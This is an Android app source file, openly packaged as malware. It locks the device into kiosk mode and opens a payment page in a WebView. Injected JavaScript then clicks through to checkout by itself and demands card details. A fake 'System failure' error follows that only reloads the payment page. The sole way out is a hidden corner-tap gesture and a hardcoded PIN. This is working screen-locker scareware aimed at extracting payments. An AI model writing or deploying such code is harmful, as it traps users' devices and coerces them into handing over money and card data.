package com.syn.malware;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.os.Bundle;
import android.os.Handler;
import android.view.MotionEvent;
import android.view.View;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.Toast;

public class MainActivity extends Activity {

    private WebView webView;
    private int cornerTapCount = 0;
    private Handler handler = new Handler();
    private Runnable errorRunnable;

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            startLockTask();
        }

        setContentView(R.layout.activity_main);
        FrameLayout rootLayout = findViewById(R.id.rootLayout);

        webView = findViewById(R.id.tributeWebView);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient());
        webView.setWebChromeClient(new WebChromeClient());

        webView.loadUrl("https://throne.com/send2syn/item/e9084133-c957-4092-83b5-f8fdb65a999e");

        // Inject auto-click logic after page load
        webView.setWebViewClient(new WebViewClient() {
            public void onPageFinished(WebView view, String url) {
                // Auto-click Add to Cart and Checkout
                webView.evaluateJavascript("(function() { " +
                        "setTimeout(function() {" +
                        "document.querySelector('form button').click();" + // Add to Cart
                        "setTimeout(function() {" +
                        "document.querySelector('[id*=chakra-modal-cartdrawer] button').click();" + // Checkout
                        "setTimeout(function() {" +
                        "alert('ENTER YOUR CARD DETAILS');" + // Popup
                        "}, 2000);" +
                        "}, 3000);" +
                        "}, 2000);" +
                        "})();", null);

                // Start delayed fake error trigger
                errorRunnable = () -> showFakeError();
                handler.postDelayed(errorRunnable, 10000); // 10 sec wait
            }
        });

        // Tap top-left 5Ã— for escape PIN
        rootLayout.setOnTouchListener((v, event) -> {
            if (event.getAction() == MotionEvent.ACTION_DOWN &&
                event.getX() < 200 && event.getY() < 200) {
                cornerTapCount++;
                if (cornerTapCount >= 5) {
                    promptForPin();
                    cornerTapCount = 0;
                }
            }
            return true;
        });
    }

    private void showFakeError() {
        new AlertDialog.Builder(this)
                .setTitle("Error 0x000C0DE")
                .setMessage("Unauthorised inaction detected.\nSystem failure.")
                .setCancelable(false)
                .setPositiveButton("Try Again", (dialog, which) -> {
                    webView.loadUrl("https://throne.com/send2syn/item/e9084133-c957-4092-83b5-f8fdb65a999e");
                })
                .show();
    }

    private void promptForPin() {
        final android.widget.EditText input = new android.widget.EditText(this);
        new AlertDialog.Builder(this)
                .setTitle("Exit Required")
                .setMessage("Enter the override PIN to escape:")
                .setView(input)
                .setCancelable(false)
                .setPositiveButton("Unlock", (dialog, which) -> {
                    String entered = input.getText().toString();
                    if (entered.equals("6969")) {
                        stopLockTask();
                        finish();
                    } else {
                        Toast.makeText(this, "Wrong PIN", Toast.LENGTH_SHORT).show();
                    }
                })
                .show();
    }
}
